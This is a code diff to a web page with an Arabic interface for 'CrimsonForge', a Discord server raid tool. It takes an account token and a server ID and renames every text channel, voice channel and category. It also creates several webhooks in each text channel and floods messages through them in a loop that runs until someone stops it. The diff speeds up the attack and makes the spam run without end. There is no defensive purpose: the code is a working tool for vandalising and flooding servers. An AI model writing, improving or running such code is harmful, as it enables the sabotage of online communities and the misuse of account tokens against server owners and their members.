@@ -56,13 +56,13 @@
       <div class="input-group"><label>🆔 آيدي السيرفر (Guild ID)</label><input type="text" id="guildId" placeholder="مثال: 123456789012345678" required /></div>
       <div class="row">
         <div class="input-group half"><label>📛 اسم الويب هوك</label><input type="text" id="webhookName" value="Crimson" /></div>
-        <div class="input-group half"><label>🔢 لكل روم</label><input type="number" id="webhooksPerRoom" value="5" min="1" /></div>
+        <div class="input-group half"><label>🔢 لكل روم</label><input type="number" id="webhooksPerRoom" value="3" min="1" /></div>
       </div>
       <div class="row">
-        <div class="input-group half"><label>🔄 جولات السبام</label><input type="number" id="spamRounds" value="20" min="1" /></div>
         <div class="input-group half"><label>📁 اسم الرومات الجديد</label><input type="text" id="newRoomName" value="CRIMSON" /></div>
+        <div class="input-group half"><label>📁 اسم الفئات الجديد</label><input type="text" id="newCategoryName" value="CRIMSON-CAT" /></div>
       </div>
-      <div class="input-group"><label>✉️ رسالة السبام</label><textarea id="spamMessage" rows="2">CrimsonForge 🔥</textarea></div>
+      <div class="input-group"><label>✉️ رسالة السبام (لانهائي حتى الإيقاف)</label><textarea id="spamMessage" rows="2">CrimsonForge 🔥</textarea></div>
       <div class="actions">
         <button type="submit" id="runBtn">🚀 تشغيل الهجوم</button>
         <button type="button" id="stopBtn">⏹️ إيقاف</button>
@@ -71,7 +71,7 @@
       <div id="progressText">0%</div>
     </form>
     <div class="stats">
-      <div>📊 <span id="statChannels">0</span> قناة</div>
+      <div>📊 <span id="statChannels">0</span> قناة/فئة</div>
       <div>🔗 <span id="statWebhooks">0</span> ويب هوك</div>
       <div>✉️ <span id="statMessages">0</span> رسالة</div>
     </div>
@@ -101,7 +101,10 @@
       logDiv.scrollTop = logDiv.scrollHeight;
     }
 
-    document.getElementById('stopBtn').addEventListener('click', () => { stopFlag = true; addLog('⏹️ أمر الإيقاف...', 'warn'); });
+    document.getElementById('stopBtn').addEventListener('click', () => { 
+      stopFlag = true; 
+      addLog('⏹️ أمر الإيقاف... سيتم إيقاف السبام فوراً', 'warn'); 
+    });
 
     document.getElementById('discordForm').addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -114,10 +117,10 @@
       const token = document.getElementById('token').value.trim();
       const guildId = document.getElementById('guildId').value.trim();
       const webhookName = document.getElementById('webhookName').value.trim() || 'Crimson';
-      const webhooksPerRoom = parseInt(document.getElementById('webhooksPerRoom').value) || 5;
-      const spamRounds = parseInt(document.getElementById('spamRounds').value) || 20;
+      const webhooksPerRoom = parseInt(document.getElementById('webhooksPerRoom').value) || 3;
       const spamMessage = document.getElementById('spamMessage').value || 'CrimsonForge 🔥';
       const newRoomName = document.getElementById('newRoomName').value.trim() || 'CRIMSON';
+      const newCategoryName = document.getElementById('newCategoryName').value.trim() || 'CRIMSON-CAT';
 
       if (!token || !guildId) { addLog('❌ أدخل التوكن وآيدي السيرفر', 'error'); return; }
 
@@ -125,7 +128,7 @@
       runBtn.disabled = true; runBtn.textContent = '⚡ جارٍ التنفيذ...';
       document.getElementById('status').textContent = '🔥 مشتعل...';
       document.getElementById('logs').innerHTML = '';
-      addLog('🚀 بدء الهجوم القرمزي...');
+      addLog('🚀 بدء الهجوم القرمزي السريع (يغير الكل + سبام لا نهائي)...');
 
       async function discordFetch(url, options = {}) {
         const response = await fetch(PROXY_URL, {
@@ -146,31 +149,44 @@
       }
 
       try {
+        // 1. جلب جميع القنوات (نصي، صوتي، فئات)
         const channels = await discordFetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, {
           headers: { Authorization: token }
         });
-        const textChannels = channels.filter(c => c.type === 0);
-        stats.channels = textChannels.length; updateStats();
-        if (textChannels.length === 0) { addLog('⚠️ لا توجد قنوات نصية!', 'warn'); return; }
-        addLog(`✅ تم العثور على ${textChannels.length} قناة.`);
+        
+        // تصفية الكل: نوع 0 (نصي)، نوع 2 (صوتي)، نوع 4 (فئة)
+        const allChannels = channels.filter(c => c.type === 0 || c.type === 2 || c.type === 4);
+        const textChannels = channels.filter(c => c.type === 0); // للويب هوكات فقط
+        
+        stats.channels = allChannels.length; 
+        updateStats();
+        if (allChannels.length === 0) { addLog('⚠️ لا توجد قنوات!', 'warn'); return; }
+        addLog(`✅ تم العثور على ${allChannels.length} قناة/فئة (نصي، صوتي، فئات).`);
 
-        let progressPerTask = 100 / (textChannels.length * 2 + (textChannels.length * webhooksPerRoom) + spamRounds);
+        // 2. تغيير أسماء الكل بسرعة فائقة
+        let progressPerTask = 70 / (allChannels.length + (textChannels.length * webhooksPerRoom)); // 70% للمرحلة الأولى
         let currentProgress = 0;
 
-        for (const ch of textChannels) {
+        for (const ch of allChannels) {
           if (stopFlag) { addLog('⏹️ تم الإيقاف.', 'warn'); return; }
           try {
+            let newName = newRoomName;
+            if (ch.type === 4) newName = newCategoryName; // للفئات اسم مختلف
+        
             await discordFetch(`https://discord.com/api/v10/channels/${ch.id}`, {
               method: 'PATCH',
               headers: { Authorization: token, 'Content-Type': 'application/json' },
-              body: JSON.stringify({ name: newRoomName })
+              body: JSON.stringify({ name: newName })
             });
-            addLog(`✅ تم تغيير #${ch.name} -> ${newRoomName}`, 'success');
+            const typeMap = { 0: 'نصي', 2: 'صوتي', 4: 'فئة' };
+            addLog(`✅ تغيير ${typeMap[ch.type] || ''} #${ch.name} -> ${newName}`, 'success');
           } catch (err) { addLog(`❌ فشل تغيير ${ch.id}`, 'error'); }
-          currentProgress += progressPerTask; setProgress(currentProgress);
-          await delay(400);
+          currentProgress += progressPerTask; 
+          setProgress(Math.min(currentProgress, 70));
+          await delay(150); // سرعة عالية جداً
         }
 
+        // 3. إنشاء ويب هوكات في القنوات النصية فقط
         const allUrls = [];
         for (const ch of textChannels) {
           for (let i = 0; i < webhooksPerRoom; i++) {
@@ -185,17 +201,22 @@
               stats.webhooks++; updateStats();
               addLog(`✅ ويب هوك في #${ch.name}`, 'success');
             } catch (err) { addLog(`❌ فشل إنشاء ويب هوك`, 'error'); }
-            currentProgress += progressPerTask * 0.8; setProgress(currentProgress);
-            await delay(300);
+            currentProgress += progressPerTask * 0.3; 
+            setProgress(Math.min(currentProgress, 95));
+            await delay(100); // سرعة
           }
         }
 
-        if (allUrls.length === 0) { addLog('⚠️ لم يتم إنشاء أي ويب هوك!', 'warn'); return; }
+        if (allUrls.length === 0) { addLog('⚠️ لم يتم إنشاء أي ويب هوك! لا يمكن السبام.', 'warn'); return; }
         addLog(`✅ تم إنشاء ${allUrls.length} ويب هوك.`);
+        setProgress(99);
+        addLog('🔥 بدء السبام اللانهائي... اضغط "إيقاف" للتوقف.', 'success');
 
-        for (let round = 1; round <= spamRounds; round++) {
-          if (stopFlag) { addLog('⏹️ تم الإيقاف.', 'warn'); return; }
+        // 4. السبام اللانهائي (لا يتوقف إلا بالزر)
+        let round = 1;
+        while (!stopFlag) {
           for (const url of allUrls) {
+            if (stopFlag) break;
             try {
               await discordFetch(url, {
                 method: 'POST',
@@ -203,24 +224,34 @@
                 body: JSON.stringify({ content: spamMessage })
               });
               stats.messages++; updateStats();
-            } catch (err) { /* تجاهل */ }
-            await delay(150);
+            } catch (err) { /* تجاهل أخطاء السبام الفردية */ }
+            await delay(50); // سبام سريع جداً
           }
-          currentProgress += progressPerTask * 0.5; setProgress(currentProgress);
-          addLog(`📩 اكتملت الجولة ${round}/${spamRounds}`, 'success');
+          if (!stopFlag) {
+            addLog(`📩 اكتملت الجولة ${round} (مستمر...)`, 'success');
+            round++;
+            // خلي الشريط على 99% وحركه شوي وهمي عشان يدل على انه شغال
+            let fakePulse = 99 + (Math.random() * 0.5);
+            setProgress(Math.min(fakePulse, 99.9));
+          }
         }
 
+        // إذا خرجنا من الـ while معناها تم الإيقاف
         setProgress(100);
-        addLog('🎉 تم تنفيذ جميع المهام بنجاح!', 'success');
-        document.getElementById('status').textContent = '✅ مكتمل';
+        addLog('⏹️ تم إيقاف السبام اللانهائي بناءً على طلبك.', 'warn');
+        document.getElementById('status').textContent = '⏹️ متوقف';
+
       } catch (err) {
         addLog(`💥 خطأ: ${err.message}`, 'error');
         document.getElementById('status').textContent = '❌ فشل';
+        setProgress(0);
       } finally {
-        runBtn.disabled = false; runBtn.textContent = '🚀 تشغيل الهجوم';
-        if (!stopFlag && document.getElementById('status').textContent !== '✅ مكتمل') {
+        runBtn.disabled = false; 
+        runBtn.textContent = '🚀 تشغيل الهجوم';
+        if (!stopFlag && document.getElementById('status').textContent !== '⏹️ متوقف') {
           document.getElementById('status').textContent = '⏳ جاهز';
         }
+        // إعادة تعيين العلم بعد الانتهاء
         stopFlag = false;
       }
     });
